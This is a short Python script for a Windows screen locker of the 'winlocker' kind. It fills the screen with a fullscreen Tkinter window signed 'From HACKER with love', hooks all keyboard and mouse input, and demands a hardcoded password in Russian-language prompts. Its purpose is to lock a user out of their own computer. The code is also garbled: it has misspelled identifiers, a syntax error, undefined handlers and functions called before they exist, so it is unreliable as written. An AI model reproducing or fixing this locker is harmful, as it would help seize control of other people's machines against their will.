import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
root=Tk()
pyautogui.FALISAFE=false 
widht=root.winfo_screenwidht()
height=root.winfo_screenheight()
root.title('From"HACKER"with love')
root.title("-fullscreen", True)
entry=Entry(root,font=1)
entry.place(widht=150, height=50,x=widht/2-75, Y=height/2-25)
Label10=Label(root,text="нюхай бэбру",font=1)
label10.grid(row=0, column=0)
label1=Label(root,text="Пиши пароль и жми CTRL+C",font)
label1.place(x=widht/2-7-130, y=height/2-25-100)
root.update()
sleep(0.2)
click(width/2, height/2)
k=False
while not k:
	on_closing()
import pythoncom, pyHook
hm=pyHook.HookManager()
hm.MouseAll=uMad
nh.KeyAll=uMad
hm.HookMouse()
hm.Hoomkeybord()
pythoncom.PumpMessages()
def callback(event):
	global k, entry
	if entry.get()=="24101991":
		k=True
def on_closing():
	click(widht/2, height/2)
	root.attributes("-fullscreen",True)
	root.protocol("WM_DELETE_WINDOW",on_closing)
	root.update()
	root.bind('<Control-KeyPess_c',callback)




